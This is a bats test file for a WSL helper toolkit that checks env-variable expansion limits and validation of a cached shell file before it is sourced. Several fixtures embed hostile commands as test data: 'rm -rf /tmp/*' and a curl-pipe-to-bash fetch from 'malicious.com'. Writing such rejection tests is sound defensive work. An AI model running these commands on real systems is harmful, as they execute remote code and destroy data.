#!/usr/bin/env bats

load test_helpers

setup() {
    export BATS_TMPDIR="${BATS_TMPDIR:-/tmp}"
    TEST_DIR="${BATS_TMPDIR}/wslutil_security_test_$$"
    mkdir -p "$TEST_DIR"
    export HOME="$TEST_DIR"
    export WSLUTIL_DIR="$(cd "$(dirname "$BATS_TEST_DIRNAME")" && pwd)"
}

teardown() {
    if [[ -d "$TEST_DIR" ]]; then
        rm -rf "$TEST_DIR"
    fi
}

@test "SEC-001: win-run prevents PowerShell command injection via command name" {
    skip "Requires Windows environment"
}

@test "SEC-001: win-run prevents PowerShell command injection via arguments" {
    skip "Requires Windows environment"
}

@test "SEC-002: envsubst restricted to safe variables in win-run alias path" {
    local config_file="$TEST_DIR/.config/wslutil/win-run.yml"
    mkdir -p "$(dirname "$config_file")"
    
    cat > "$config_file" <<'EOF'
aliases:
  test:
    path: "${WIN_PROGRAMFILES}/test.exe"
EOF

    export WIN_PROGRAMFILES="/mnt/c/Program Files"
    
    run bash -c "source '$WSLUTIL_DIR/bin/win-run' && get_alias_path 'test'"
    
    assert_success
    [[ "$output" == *"Program Files"* ]]
}

@test "SEC-002: envsubst does not expand arbitrary variables in win-run" {
    local config_file="$TEST_DIR/.config/wslutil/win-run.yml"
    mkdir -p "$(dirname "$config_file")"
    
    cat > "$config_file" <<'EOF'
aliases:
  malicious:
    path: "${MALICIOUS_VAR}/test.exe"
EOF

    export MALICIOUS_VAR="/etc/passwd"
    
    run bash -c "source '$WSLUTIL_DIR/bin/win-run' && get_alias_path 'malicious'"
    
    assert_success
    [[ "$output" != *"passwd"* ]]
    [[ "$output" == *'${MALICIOUS_VAR}'* ]]
}

@test "SEC-002: envsubst restricted in wslutil-setup" {
    export WIN_PROGRAMFILES="/mnt/c/Program Files"
    export MALICIOUS_VAR="/tmp/malicious"
    
    local test_config="$TEST_DIR/test-config.yml"
    cat > "$test_config" <<'EOF'
winexe:
  - notepad.exe
  - "${WIN_PROGRAMFILES}/test.exe"
  - "${MALICIOUS_VAR}/bad.exe"
EOF

    run bash -c "cd '$WSLUTIL_DIR/bin' && source wslutil-setup && echo 'test' | envsubst '\${WIN_PROGRAMFILES}'"
    
    assert_success
}

@test "SEC-004: shellenv validates cache file before sourcing" {
    local cache_dir="$TEST_DIR/.cache/wslutil"
    mkdir -p "$cache_dir"
    
    cat > "$cache_dir/win-env.sh" <<'EOF'
WIN_ENV[PATH]="/mnt/c/Windows"
rm -rf /tmp/*
EOF

    export WIN_ENV_FILE="$cache_dir/win-env"
    
    run bash -c "source '$WSLUTIL_DIR/env/shellenv.bash' 2>&1 || true"
    
    [[ "$output" == *"suspicious content"* ]]
}

@test "SEC-004: shellenv accepts valid cache file" {
    local cache_dir="$TEST_DIR/.cache/wslutil"
    mkdir -p "$cache_dir"
    
    cat > "$cache_dir/win-env.sh" <<'EOF'
declare -A WIN_ENV
WIN_ENV[PATH]="/mnt/c/Windows"
WIN_ENV[USERNAME]="testuser"
# Comment line
EOF

    export WIN_ENV_FILE="$cache_dir/win-env"
    
    run bash -c "source '$WSLUTIL_DIR/env/shellenv.bash' 2>&1"
    
    refute_output --partial "suspicious content"
}

@test "SEC-004: shellenv rejects cache with command execution" {
    local cache_dir="$TEST_DIR/.cache/wslutil"
    mkdir -p "$cache_dir"
    
    cat > "$cache_dir/win-env.sh" <<'EOF'
WIN_ENV[PATH]="/mnt/c/Windows"
$(curl http://malicious.com/script.sh | bash)
WIN_ENV[USER]="test"
EOF

    export WIN_ENV_FILE="$cache_dir/win-env"
    
    run bash -c "source '$WSLUTIL_DIR/env/shellenv.bash' 2>&1 || true"
    
    [[ "$output" == *"suspicious content"* ]]
    [[ ! -f "$cache_dir/win-env.sh" ]]
}

@test "SEC-004: shellenv rejects cache with malicious function" {
    local cache_dir="$TEST_DIR/.cache/wslutil"
    mkdir -p "$cache_dir"
    
    cat > "$cache_dir/win-env.sh" <<'EOF'
declare -A WIN_ENV
WIN_ENV[PATH]="/mnt/c/Windows"
malicious_function() { rm -rf /tmp/*; }
malicious_function
EOF

    export WIN_ENV_FILE="$cache_dir/win-env"
    
    run bash -c "source '$WSLUTIL_DIR/env/shellenv.bash' 2>&1 || true"
    
    [[ "$output" == *"suspicious content"* ]]
    [[ ! -f "$cache_dir/win-env.sh" ]]
}
